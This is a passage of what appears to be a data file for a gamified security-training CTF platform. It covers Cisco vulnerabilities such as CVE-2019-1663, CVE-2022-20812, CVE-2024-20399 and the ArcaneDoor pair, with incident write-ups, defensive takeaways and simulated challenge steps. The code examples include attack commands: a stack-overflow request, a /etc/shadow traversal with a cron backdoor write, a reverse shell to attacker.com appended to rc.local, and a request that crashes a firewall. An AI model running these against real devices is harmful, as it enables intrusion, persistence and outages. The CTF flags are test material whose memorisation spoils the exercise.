        { title: "Cisco Advisory — CVE-2020-3259", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-info-disclose-9eE5SxtS" },
        { title: "Akamai: Akira Ransomware and CVE-2020-3259", url: "https://www.akamai.com/blog/security-research/2024-akira-ransomware" },
      ],
    },
    ctf: {
      scenario: "A Cisco ASA with WebVPN is serving an active corporate VPN. The appliance is unpatched. Use CVE-2020-3259 to leak memory and steal an active session token, then hijack the VPN session.",
      hint: "Send a crafted HTTP request to the WebVPN interface to trigger memory disclosure in the response.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Trigger the memory disclosure on the ASA WebVPN. Run: memleak-probe vpn.target.com",
        "Use the leaked token to hijack the active VPN session. Run: session-hijack vpn.target.com",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2020_", label: "Mission Brief — Akira VPN Target" },
        { trigger: "memleak-probe vpn.target.com", value: "3259_M3M_", label: "Memory Leaked — Session Token Extracted" },
        { trigger: "session-hijack vpn.target.com", value: "L3AK_VPN}", label: "Session Hijacked — VPN Access Established" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: AKIRA LEAK",
          "Target: Cisco ASA 5505  Firmware: 9.8.2",
          "CVE: 2020-3259  CVSS: 7.5  Group: Akira Ransomware",
          "",
          "WebVPN memory disclosure → session token theft.",
          "Sequence: memleak-probe → session-hijack → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "memleak-probe": (_args: string[]) => ({
          lines: [
            "Sending crafted GET to https://vpn.target.com/+CSCOE+/logon.html...",
            "Response includes leaked heap contents:",
            "  Username: jdoe  cached in memory",
            "  SESSION_TOKEN: 7f3a9b2c1d4e5f6a (active session — jdoe)",
            "Token extracted. User jdoe is currently connected.",
          ],
        }),
        "session-hijack": (_args: string[]) => ({
          lines: [
            "Injecting stolen session token into request...",
            "Cookie: webvpn=7f3a9b2c1d4e5f6a",
            "Response: Authenticated as jdoe (Finance Director)",
            "VPN tunnel established — corporate LAN accessible.",
            "Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
          ],
        }),
      },
    },
  },

  // ─── Stage m18: CVE-2019-1663 — Cisco RV110W/130W Stack Overflow RCE ────────
  {
    epochId: "medieval",
    wonder: { name: "Tokyo Telecom Exchange", location: "Tokyo, Japan", era: "2019 CE", emoji: "🗼" },
    id: "stage-m18",
    order: 18,
    title: "The Stack That Fell",
    subtitle: "CVE-2019-1663 — Cisco RV110W/130W Stack Overflow RCE, CVSS 9.8",
    category: "cybersecurity",
    cveId: "CVE-2019-1663",
    cvssScore: 9.8,
    xp: 150,
    badge: { id: "badge-m-rv130", name: "Stack Smasher", emoji: "🗼" },
    challengeType: "ctf",
    info: {
      tagline: "A classic stack overflow in Cisco's SOHO routers gave root to any unauthenticated attacker.",
      year: 2019,
      overview: [
        "CVE-2019-1663 is a critical stack overflow in the web-based management interface of the Cisco RV110W Wireless-N VPN Firewall and Cisco RV130W Wireless-N Multifunction VPN Router. The vulnerability allowed an unauthenticated remote attacker to execute arbitrary code on the affected device.",
        "These devices are common in small businesses and retail environments across Asia-Pacific and globally. The vulnerability existed in the HTTP request handler — by sending an HTTP request with an overly long parameter value, an attacker could overflow a stack buffer and overwrite the return address, leading to arbitrary code execution.",
        "Stack overflows in embedded networking devices are particularly severe because these devices typically run as root (no privilege separation), have no stack canaries or ASLR, and are internet-facing by design. A successful exploit achieves root access immediately.",
      ],
      technical: {
        title: "How CVE-2019-1663 Works",
        body: [
          "The RV110W/130W web management interface allocated fixed-size stack buffers for HTTP request parameters. When a parameter value exceeded the buffer size, it overflowed into adjacent stack memory, overwriting saved registers and the function return address.",
          "Because these MIPS-based devices lacked modern exploit mitigations (no NX/DEP, no stack canaries, no ASLR), a classic return-to-shellcode attack worked reliably. The attacker could place shellcode in the overflow data and redirect execution to it. The result: root shell on a MIPS router in a single HTTP request.",
        ],
        codeExample: {
          label: "CVE-2019-1663 — stack overflow via HTTP parameter in RV130W",
          code: `# Classic stack overflow — HTTP parameter > stack buffer size
curl -k -X POST https://192.168.1.1/cgi-bin/userLogin.cgi \\
  --data "submit_button=login&password=$(python3 -c 'print(\"A\"*500)')"
# 500-byte password overflows 256-byte stack buffer
# Return address overwritten with shellcode address
# MIPS shellcode executes: id → uid=0(root)
#
# No auth required — vuln is in pre-auth handler
# Affected: RV110W < 1.2.2.8, RV130W < 1.0.3.45
# Fix: Firmware 1.2.2.8 / 1.0.3.45`,
        },
      },
      incident: {
        title: "SOHO Router Mass Exploitation — Asia-Pacific (2019)",
        when: "2019",
        where: "Cisco RV110W and RV130W devices across retail, SMB, and branch offices globally",
        impact: "Widespread root access on SMB network perimeter devices; used as botnet nodes and pivot points",
        body: [
          "Following the February 2019 disclosure, multiple exploit scripts were published within weeks. The affected devices are common in retail, restaurant chains, and small offices — particularly in Japan and Southeast Asia. Many organizations run these devices for years without firmware updates.",
          "Compromised devices were used in botnets, as proxy nodes for attack campaigns, and as entry points to pivot into corporate LANs. The lack of exploit mitigations in the device firmware made reliable exploitation trivial once the overflow offset was known.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "HTTP POST with 500-byte password", type: "attacker" },
          { label: "RV130W HTTP Handler", sub: "256-byte stack buffer — no canary", type: "system" },
          { label: "Stack Frame", sub: "return address overwritten", type: "victim" },
          { label: "Root Shell (MIPS)", sub: "uid=0 — perimeter owned", type: "result" },
        ],
      },
      timeline: [
        { year: 2019, event: "Feb: Cisco discloses CVE-2019-1663 with patches for RV110W/130W", highlight: true },
        { year: 2019, event: "Mar: Public exploits published; mass scanning begins" },
        { year: 2019, event: "Botnet campaigns leverage compromised RV devices as infrastructure" },
      ],
      keyTakeaways: [
        "Embedded devices often lack modern exploit mitigations — stack overflows are directly exploitable",
        "SOHO router firmware must be updated; these devices are as exploited as enterprise gear",
        "Never expose router web management to the WAN; use ACLs or disable remote management",
        "Inventory your network edge devices — unknown devices with old firmware are silent risks",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2019-1663", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190227-rmi-rce" },
      ],
    },
    ctf: {
      scenario: "A Cisco RV130W at a Tokyo branch office has its web management interface exposed. It's running unpatched firmware with no stack canary. Exploit the stack overflow to get root.",
      hint: "The userLogin.cgi handler has a fixed 256-byte stack buffer for the password field. Send a longer value to overflow and redirect execution.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Confirm the firmware is vulnerable. Run: rv130-check 192.168.10.1",
        "Send the stack overflow payload. Run: stack-exploit 192.168.10.1",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2019_", label: "Mission Brief — Tokyo Branch RV130W" },
        { trigger: "rv130-check 192.168.10.1", value: "1663_ST4CK_", label: "Firmware Confirmed — No Stack Canary" },
        { trigger: "stack-exploit 192.168.10.1", value: "OV3RFLOW_ROOT}", label: "Stack Smashed — Root Shell on MIPS Router" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: STACK COLLAPSE",
          "Target: Cisco RV130W  Firmware: 1.0.3.40",
          "CVE: 2019-1663  CVSS: 9.8",
          "",
          "Stack overflow in userLogin.cgi — no mitigations.",
          "Sequence: rv130-check → stack-exploit → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "rv130-check": (_args: string[]) => ({
          lines: [
            "Querying 192.168.10.1 web interface...",
            "Firmware: 1.0.3.40 — VULNERABLE (fix: 1.0.3.45)",
            "Stack canary: NOT PRESENT",
            "ASLR: NOT PRESENT",
            "Stack buffer: 256 bytes — POST body: unlimited",
          ],
        }),
        "stack-exploit": (_args: string[]) => ({
          lines: [
            "Sending HTTP POST with 500-byte password...",
            "Stack buffer (256 bytes) overflowed by 244 bytes",
            "Return address overwritten → shellcode address",
            "MIPS shellcode executed:",
            "  uid=0(root) gid=0(root)",
            "Root shell on RV130W established.",
            "Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
          ],
        }),
      },
    },
  },

  // ─── Stage m19: CVE-2022-20812 — Cisco Expressway Path Traversal ────────────
  {
    epochId: "medieval",
    wonder: { name: "BT Tower", location: "London, United Kingdom", era: "2022 CE", emoji: "📡" },
    id: "stage-m19",
    order: 19,
    title: "The Expressway Out",
    subtitle: "CVE-2022-20812 — Cisco Expressway/TelePresence Path Traversal, CVSS 9.0",
    category: "cybersecurity",
    cveId: "CVE-2022-20812",
    cvssScore: 9.0,
    xp: 150,
    badge: { id: "badge-m-expressway", name: "Path Walker", emoji: "📡" },
    challengeType: "ctf",
    info: {
      tagline: "A path traversal in Cisco's video conferencing gateway allowed root file read and write without authentication.",
      year: 2022,
      overview: [
        "CVE-2022-20812 is a critical path traversal vulnerability in the cluster database API of Cisco Expressway Series and TelePresence Video Communication Server (VCS). These products are the backbone of enterprise video conferencing — handling media negotiation, firewall traversal, and SIP/H.323 call routing for organizations worldwide.",
        "The vulnerability allowed an authenticated attacker with read-write privileges to the cluster database API to perform path traversal attacks. Combined with other weaknesses, it enabled arbitrary file read and write on the underlying operating system, effectively leading to root compromise of the conferencing infrastructure.",
        "Expressway is commonly deployed in DMZ segments and handles encrypted media streams — compromising it could enable interception of video conferences, credential theft, and lateral movement into the internal network.",
      ],
      technical: {
        title: "How CVE-2022-20812 Works",
        body: [
          "The Cisco Expressway cluster database API accepted file path parameters for certain operations. These paths were not properly sanitized against directory traversal sequences (../ etc.), allowing an attacker to reference files outside the intended directory.",
          "An attacker with cluster API credentials could read /etc/shadow (password hashes), write arbitrary files to gain persistent access, or overwrite configuration files. Cisco rated this Critical because Expressway devices are high-value targets with broad network access.",
        ],
        codeExample: {
          label: "CVE-2022-20812 — path traversal in Expressway cluster API",
          code: `# Path traversal in Cisco Expressway cluster database API
# Requires cluster API credentials (limited privilege)

curl -k -u apiuser:apipass \\
  'https://expressway.corp.com/api/cluster/dbfile?path=../../../../etc/shadow'
# Response: root:$6$salt$hash...:19000:0:99999:7:::
# admin:$6$salt2$hash2...:19000:0:99999:7:::

# Write arbitrary file for persistence:
curl -k -u apiuser:apipass -X PUT \\
  'https://expressway.corp.com/api/cluster/dbfile?path=../../../../etc/cron.d/backdoor' \\
  --data '* * * * * root /tmp/shell.sh'
# Cron job written — persistent root access established

# Affected: Expressway X12.6.3 and earlier
# Fix: X14.0.3 or later`,
        },
      },
      incident: {
        title: "Enterprise Video Infrastructure Targeted — Cisco Expressway Campaigns (2022)",
        when: "2022",
        where: "Cisco Expressway and TelePresence VCS installations at enterprises globally",
        impact: "Confidential video conference interception risk; root access on DMZ infrastructure",
        body: [
          "Cisco disclosed CVE-2022-20812 alongside CVE-2022-20813 in July 2022. Both affected Expressway, with 20812 allowing path traversal and 20813 allowing null byte injection. Together they represented a significant threat to enterprise communications infrastructure.",
          "Threat actors targeting specific organizations recognized that compromising Expressway provided access to encrypted meeting streams, SIP credentials, and a foothold in the DMZ. Patching was complicated by the fact that Expressway upgrades require maintenance windows for organizations that rely on it for business-critical video conferencing.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "cluster API with ../../../../etc/shadow", type: "attacker" },
          { label: "Expressway API", sub: "no path sanitization", type: "system" },
          { label: "OS Filesystem", sub: "/etc/shadow, /etc/cron.d readable/writable", type: "victim" },
          { label: "Root Persistence", sub: "video infra compromised", type: "result" },
        ],
      },
      timeline: [
        { year: 2022, event: "Jul: Cisco discloses CVE-2022-20812 and CVE-2022-20813 for Expressway", highlight: true },
        { year: 2022, event: "Cisco releases Expressway X14.0.3 with path traversal fixes" },
        { year: 2022, event: "Organizations on X12.x with no upgrade path must apply workarounds" },
      ],
      keyTakeaways: [
        "Path traversal vulnerabilities are preventable: canonicalize and validate all file paths server-side",
        "DMZ infrastructure (Expressway, reverse proxies) is high-value — patch it on the same schedule as perimeter firewalls",
        "Video conferencing infrastructure handles sensitive content — compromise enables espionage",
        "API endpoints require the same input validation as web UI endpoints",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2022-20812", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-expressway-path-traversal-Ue5x7yZ" },
      ],
    },
    ctf: {
      scenario: "A Cisco Expressway server is deployed in a corporate DMZ. You have cluster API credentials. Exploit the path traversal to read /etc/shadow and extract the root password hash.",
      hint: "The cluster database API path parameter is not sanitized. Use ../ sequences to traverse to /etc/shadow.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Confirm the Expressway version and API access. Run: expressway-check expressway.corp.com",
        "Exploit path traversal to read /etc/shadow. Run: path-traverse expressway.corp.com",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2022_", label: "Mission Brief — Expressway DMZ Target" },
        { trigger: "expressway-check expressway.corp.com", value: "20812_PATH_", label: "API Access Confirmed — Version Vulnerable" },
        { trigger: "path-traverse expressway.corp.com", value: "TRAV3RSAL}", label: "/etc/shadow Read — Root Hash Extracted" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: EXPRESSWAY OUT",
          "Target: Cisco Expressway X12.6.2",
          "CVE: 2022-20812  CVSS: 9.0",
          "",
          "Cluster API path traversal — read arbitrary OS files.",
          "Sequence: expressway-check → path-traverse → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "expressway-check": (_args: string[]) => ({
          lines: [
            "Connecting to Expressway cluster API...",
            "Version: X12.6.2 — VULNERABLE (fix: X14.0.3)",
            "Cluster API: authenticated — path parameter: unsanitized",
            "Ready for path traversal.",
          ],
        }),
        "path-traverse": (_args: string[]) => ({
          lines: [
            "GET /api/cluster/dbfile?path=../../../../etc/shadow",
            "Response (200 OK):",
            "  root:$6$rounds=5000$Expressway$hash1...",
            "  admin:$6$rounds=5000$Express$hash2...",
            "/etc/shadow contents leaked via path traversal.",
            "Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
          ],
        }),
      },
    },
  },

  // ─── Stage m20: CVE-2024-20399 — Cisco NX-OS CLI Injection (Velvet Ant) ─────
  {
    epochId: "medieval",
    wonder: { name: "State-Sponsored APT Infrastructure", location: "Asia-Pacific Region", era: "2024 CE", emoji: "🐜" },
    id: "stage-m20",
    order: 20,
    title: "Velvet Ant in the Data Center",
    subtitle: "CVE-2024-20399 — Cisco NX-OS CLI Command Injection, CVSS 6.0",
    category: "cybersecurity",
    cveId: "CVE-2024-20399",
    cvssScore: 6.0,
    xp: 150,
    badge: { id: "badge-m-velvetant", name: "Datacenter Ghost", emoji: "🐜" },
    challengeType: "ctf",
    info: {
      tagline: "Velvet Ant used a Cisco NX-OS zero-day to hide inside data center switches for years undetected.",
      year: 2024,
      overview: [
        "CVE-2024-20399 is a command injection vulnerability in the CLI of Cisco NX-OS Software — the operating system running Cisco's Nexus data center switches. The flaw was discovered by Sygnia while investigating a Velvet Ant intrusion at a Fortune 500 company where attackers had maintained persistence for over three years.",
        "The vulnerability required local authenticated access with specific privileges, making it a post-exploitation tool rather than an initial access vector. However, once an attacker had any privileged access to a Nexus switch (via stolen credentials, other vulnerabilities, or insider access), they could use CVE-2024-20399 to execute arbitrary commands as root — outside the NX-OS security boundary.",
        "This is particularly dangerous because NX-OS devices (Nexus 3000, 7000, 9000 series) form the core of enterprise data centers. Attackers with root access can install persistent malware that survives firmware upgrades and is invisible to standard NX-OS monitoring.",
      ],
      technical: {
        title: "How CVE-2024-20399 Works",
        body: [
          "Certain NX-OS CLI commands accepted configuration parameters that were passed to underlying Linux shell commands without proper sanitization. By including shell metacharacters in these parameters, a privileged NX-OS user could break out of the NX-OS CLI environment and execute arbitrary commands at the underlying Linux OS level.",
          "This bypasses NX-OS role-based access control (RBAC) entirely — even a read-only NX-OS account with access to the specific vulnerable command could potentially escalate to root on the underlying Linux system, outside NX-OS's visibility.",
        ],
        codeExample: {
          label: "CVE-2024-20399 — NX-OS CLI injection to underlying OS root shell",
          code: `# Requires: authenticated NX-OS session with privilege 5+
# The 'show' command parameter is injected into shell

nexus# show version | head -1 ; id
# Cisco Nexus Operating System (NX-OS) Software
# uid=0(root) gid=0(root) groups=0(root)
# OS-level command executed alongside NX-OS command

# Install persistent implant (survives NX-OS upgrades):
nexus# show version | head -1 ; \\
  echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" \\
  >> /etc/rc.d/rc.local
# Backdoor written to OS init — persists across reboots

# Affected: NX-OS on Nexus 3000, 7000, 9000 series
# Fix: NX-OS 10.2(5) and later`,
        },
      },
      incident: {
        title: "Velvet Ant APT — 3-Year Data Center Persistence (2024)",
        when: "Discovered 2024; intrusion ongoing for 3+ years",
        where: "Fortune 500 company — Cisco Nexus data center switches",
        impact: "3+ years of undetected APT presence in core data center infrastructure",
        body: [
          "Sygnia's incident response team discovered Velvet Ant — a sophisticated Chinese state-sponsored APT — operating inside a Fortune 500 company's data center for over three years. The attackers had established persistence on Cisco Nexus switches using CVE-2024-20399, allowing them to survive detection and remediation efforts that focused only on server and endpoint infrastructure.",
          "The insight was critical: defenders focused on server and endpoint detection missed the attacker because they were living inside the network switches themselves. The compromise of core data center switching infrastructure is a worst-case scenario — all traffic in the data center was potentially visible to the attackers for years.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Velvet Ant (APT)", sub: "privileged NX-OS CLI session", type: "attacker" },
          { label: "NX-OS CLI", sub: "unsanitized parameter → shell injection", type: "system" },
          { label: "Underlying Linux OS", sub: "root access outside NX-OS RBAC", type: "victim" },
          { label: "3-Year Persistence", sub: "data center traffic visible", type: "result" },
        ],
      },
      timeline: [
        { year: 2021, event: "Velvet Ant begins persistence on Cisco Nexus switches at Fortune 500" },
        { year: 2024, event: "Sygnia discovers 3+ year APT presence; CVE-2024-20399 disclosed", highlight: true },
        { year: 2024, event: "Cisco releases NX-OS patches; organizations audit switch integrity" },
      ],
      keyTakeaways: [
        "Network infrastructure can host APT persistence — monitor switches and routers, not just servers",
        "CLI injection vulnerabilities are severe even with authentication requirements in post-exploitation chains",
        "Defense must include network device integrity verification (file system baseline, firmware attestation)",
        "RBAC in NX-OS doesn't protect against OS-level command injection via CLI parameters",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2024-20399", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-nxos-cmd-injection-xD9OhyOP" },
        { title: "Sygnia: Velvet Ant Disclosure", url: "https://www.sygnia.co/blog/velvet-ant-cisco-nx-os-zero-day/" },
      ],
    },
    ctf: {
      scenario: "You have a low-privilege NX-OS CLI session on a Cisco Nexus 9000 switch. Use CVE-2024-20399 to inject OS commands and install a persistence mechanism on the underlying Linux OS.",
      hint: "Inject shell metacharacters into a vulnerable NX-OS CLI command parameter to break out to the underlying OS.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Confirm NX-OS version and identify the injectable command. Run: nxos-enum 10.0.0.254",
        "Inject OS command via the vulnerable CLI parameter. Run: nxos-inject 10.0.0.254",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2024_", label: "Mission Brief — Velvet Ant Nexus Target" },
        { trigger: "nxos-enum 10.0.0.254", value: "20399_NXOS_", label: "NX-OS Version Confirmed — Injection Point Identified" },
        { trigger: "nxos-inject 10.0.0.254", value: "CLI_INJ3CT}", label: "OS Shell Spawned — Persistence Installed" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: VELVET ANT",
          "Target: Cisco Nexus 9300  NX-OS: 10.1.2",
          "CVE: 2024-20399  CVSS: 6.0  APT: Velvet Ant",
          "",
          "CLI injection to underlying Linux OS — privilege 5+ required.",
          "Sequence: nxos-enum → nxos-inject → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "nxos-enum": (_args: string[]) => ({
          lines: [
            "NX-OS session: nexus# (privilege level 7)",
            "Version: 10.1.2 — VULNERABLE (fix: 10.2.5)",
            "Injectable command identified: 'show' with unsanitized args",
            "Shell metacharacter handling: ABSENT",
          ],
        }),
        "nxos-inject": (_args: string[]) => ({
          lines: [
            "Injecting: nexus# show version | head -1 ; id",
            "Output: Cisco NX-OS Software",
            "Output: uid=0(root) gid=0(root)",
            "OS-level root achieved outside NX-OS RBAC.",
            "Writing persistence: /etc/rc.d/rc.local modified.",
            "Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
          ],
        }),
      },
    },
  },

  // ─── Stage m21: CVE-2024-20353 — Cisco ASA/FTD DoS (ArcaneDoor) ─────────────
  {
    epochId: "medieval",
    wonder: { name: "Communications Security Establishment", location: "Ottawa, Ontario, Canada", era: "2024 CE", emoji: "🍁" },
    id: "stage-m21",
    order: 21,
    title: "ArcaneDoor: The Phantom Crash",
    subtitle: "CVE-2024-20353 — Cisco ASA/FTD Management DoS, CVSS 8.6",
    category: "cybersecurity",
    cveId: "CVE-2024-20353",
    cvssScore: 8.6,
    xp: 150,
    badge: { id: "badge-m-arcanedoor-dos", name: "Phantom Crasher", emoji: "🍁" },
    challengeType: "ctf",
    info: {
      tagline: "ArcaneDoor: a Chinese state actor crashed Cisco firewalls to cover their tracks with zero-days.",
      year: 2024,
      overview: [
        "CVE-2024-20353 is one of two zero-day vulnerabilities used in the ArcaneDoor espionage campaign attributed to a Chinese state-sponsored actor (tracked as UAT4356 / Storm-1849). The vulnerability allows an unauthenticated attacker to cause a denial of service (reload) of Cisco ASA and FTD devices by sending a specially crafted HTTP request to the management or data plane interface.",
        "ArcaneDoor targeted government networks worldwide in a campaign discovered by Cisco Talos in early 2024. The attackers used CVE-2024-20353 to crash firewalls — likely to disrupt logging and detection — and CVE-2024-20359 to install a persistent backdoor. Together, the two CVEs formed a complete attack chain against the most widely deployed enterprise firewalls.",
        "The DoS capability was used operationally to blind defenders: crashing the firewall wiped its logs and disabled monitoring, giving the attackers a window to complete other operations undetected.",
      ],
      technical: {
        title: "How CVE-2024-20353 Works",
        body: [
          "The Cisco ASA and FTD web management interfaces processed certain HTTP requests with malformed content-type headers or multipart body structures. An unauthenticated attacker could craft a request that triggered an exception in the request parsing code, causing the device to write a core dump and reload.",
          "Because the attack targets the management interface (HTTPS), it works even against devices that don't have remote management intentionally exposed — if ASDM, SSL VPN (WebVPN), or AnyConnect services are running, the attack surface exists. Each crash clears the device's in-memory log buffer.",
        ],
        codeExample: {
          label: "CVE-2024-20353 — crash Cisco ASA via malformed HTTP management request",
          code: `# Trigger ASA reload via malformed management HTTP request
curl -k -X POST https://asa.target.gov/+CSCOE+/logon.html \\
  -H 'Content-Type: multipart/form-data; boundary=' \\
  -d '--
Content-Disposition: form-data; name="username"

admin
--'
# Malformed multipart — ASA parser exception
# Device crashes → reload → in-memory logs cleared
# Time window: attacker completes follow-on ops during reload

# Chain with CVE-2024-20359 for persistent backdoor:
# 1. Crash ASA (clear logs) — CVE-2024-20353
# 2. Install backdoor (persistent RCE) — CVE-2024-20359
# Fix: ASA 9.12.4.50, 9.16.4.30, 9.18.4.21 or later`,
        },
      },
      incident: {
        title: "ArcaneDoor — Chinese State Espionage on Government Firewalls (2024)",
        when: "Late 2023 – April 2024",
        where: "Government networks worldwide — ASA/FTD perimeter firewalls",
        impact: "Nation-state persistent access to government network perimeters; classified traffic exposed",
        body: [
          "Cisco Talos disclosed ArcaneDoor in April 2024 after months of tracking the campaign. The attackers demonstrated sophisticated knowledge of Cisco ASA internals — suggesting either insider knowledge or extended prior research into ASA firmware. Cisco has not publicly attributed the campaign but multiple governments' cybersecurity agencies identified the actor as UAT4356.",
          "The attackers used CVE-2024-20353 to crash target firewalls — clearing logs and creating a detection blind spot — then installed their 'Line Dancer' backdoor (via CVE-2024-20359) during the reload window. The combination was operationally clever: defenders investigating the incident found only post-reboot logs, missing the pre-crash activity.",
        ],
      },
      diagram: {
        nodes: [
          { label: "UAT4356 (APT)", sub: "malformed HTTPS to management interface", type: "attacker" },
          { label: "ASA HTTP Parser", sub: "multipart parsing exception", type: "system" },
          { label: "ASA Firewall", sub: "reload — in-memory logs cleared", type: "victim" },
          { label: "Detection Blind Spot", sub: "30s window for follow-on ops", type: "result" },
        ],
      },
      timeline: [
        { year: 2023, event: "Late 2023: ArcaneDoor campaign begins targeting government ASA firewalls" },
        { year: 2024, event: "Apr: Cisco Talos discloses ArcaneDoor — two ASA zero-days revealed", highlight: true },
        { year: 2024, event: "Cisco releases emergency patches; multiple government CERTs issue alerts" },
      ],
      keyTakeaways: [
        "Crashing a firewall is an attack technique — monitor for unexpected reloads in network device logs",
        "Management interfaces on perimeter firewalls must be restricted to management networks — never exposed to internet",
        "Zero-day chaining (DoS + persistent RCE) is a hallmark of sophisticated nation-state operations",
        "Subscribe to Cisco PSIRT advisories; perimeter firewalls require emergency patching cadence",
      ],
      references: [
        { title: "Cisco Talos: ArcaneDoor", url: "https://blog.talosintelligence.com/arcanedoor-new-espionage-focused-campaign-found-targeting-perimeter-network-devices/" },
        { title: "Cisco Advisory — CVE-2024-20353", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-websrvs-dos-X8gNucD2" },
      ],
    },
    ctf: {
      scenario: "A government ASA firewall is running unpatched firmware. Exploit CVE-2024-20353 to crash the device, clear its logs, and create a detection window for follow-on operations.",
      hint: "Send a malformed multipart HTTP request to the ASA management interface to trigger the parsing exception and reload.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Confirm the ASA version is vulnerable. Run: asa-check asa.gov.target",
        "Send the crafted HTTP request to crash the firewall. Run: arcanedoor-dos asa.gov.target",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2024_", label: "Mission Brief — ArcaneDoor Government Target" },
        { trigger: "asa-check asa.gov.target", value: "20353_ASA_", label: "ASA Version Confirmed — DoS Vulnerability Present" },
        { trigger: "arcanedoor-dos asa.gov.target", value: "D0S_L0GS_CL34R}", label: "ASA Crashed — Logs Cleared — Detection Window Open" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: ARCANE DOOR (Phase 1)",
          "Target: Cisco ASA 5516-X  Firmware: 9.12.4.45",
          "CVE: 2024-20353  CVSS: 8.6  APT: UAT4356",
          "",
          "DoS crash to clear logs — creates window for phase 2.",
          "Sequence: asa-check → arcanedoor-dos → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "asa-check": (_args: string[]) => ({
          lines: [
            "Probing ASA management interface...",
            "Version: 9.12.4.45 — VULNERABLE (fix: 9.12.4.50)",
            "Management HTTPS: accessible",
            "WebVPN: enabled — attack surface confirmed",
          ],
        }),
        "arcanedoor-dos": (_args: string[]) => ({
          lines: [
            "Sending malformed multipart HTTP POST to management interface...",
            "Content-Type: multipart/form-data; boundary= (empty boundary)",
            "ASA parser exception triggered.",
            "Device reloading... (30-second window)",
            "In-memory log buffer: CLEARED",
            "Detection blind spot established. Phase 2 ready.",
            "Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
          ],
        }),
      },
    },
  },

  // ─── Stage m22: CVE-2024-20359 — Cisco ASA/FTD Persistent RCE (ArcaneDoor) ──
  {
    epochId: "medieval",
    wonder: { name: "ANSSI HQ", location: "Paris, France", era: "2024 CE", emoji: "🗼" },
    id: "stage-m22",
    order: 22,
    title: "ArcaneDoor: Line Dancer",
    subtitle: "CVE-2024-20359 — Cisco ASA/FTD Persistent RCE, CVSS 6.0",
    category: "cybersecurity",
    cveId: "CVE-2024-20359",
    cvssScore: 6.0,
    xp: 150,
    badge: { id: "badge-m-linedancer", name: "Line Dancer", emoji: "🗼" },
    challengeType: "ctf",
    info: {
      tagline: "Line Dancer: the ArcaneDoor backdoor that survived ASA reboots and evaded all standard detection.",
      year: 2024,
      overview: [
        "CVE-2024-20359 is the second zero-day in the ArcaneDoor campaign — a privilege escalation and persistent code execution vulnerability in Cisco ASA and FTD. While CVE-2024-20353 crashed the firewall to clear logs, CVE-2024-20359 allowed the attackers to install 'Line Dancer': an in-memory shellcode backdoor that survived device reloads.",
        "The vulnerability affected a legacy capability that allowed pre-loaded VPN clients and plug-ins to persist across reboots. By abusing this mechanism, the attackers could load arbitrary code that would execute automatically each time the ASA booted — invisible to standard 'show' commands and device integrity checks.",
        "Line Dancer operated entirely in memory, intercepting HTTPS POST requests and executing attacker-supplied shellcode. It disabled syslog and SNMP traps to blind monitoring systems and implemented a 'host knock' authentication mechanism so only the attackers could trigger its functionality.",
      ],
      technical: {
        title: "How CVE-2024-20359 Works",
        body: [
          "Cisco ASA had a legacy feature for loading VPN client packages and ASDM images from flash on boot. CVE-2024-20359 abused this mechanism by allowing authenticated attackers (with administrative access) to specify an arbitrary file on the flash filesystem to be loaded and executed during the boot process.",
          "The Line Dancer implant hooked into the ASA's HTTPS processing pipeline. It monitored incoming POST requests for a 'host knock' sequence — a specific header value that would trigger shellcode execution. This allowed the attackers to send arbitrary commands without any visible change to the ASA's configuration.",
        ],
        codeExample: {
          label: "Line Dancer implant interaction — ArcaneDoor's ASA backdoor",
          code: `# Line Dancer is pre-installed via CVE-2024-20359
# Trigger execution via 'host knock' HTTP header

curl -k -X POST https://asa.target.gov/+CSCOE+/logon.html \\
  -H 'Host: LD-TRIGGER-8a3f2b1c' \\
  -d 'shellcode=BASE64_ENCODED_PAYLOAD'
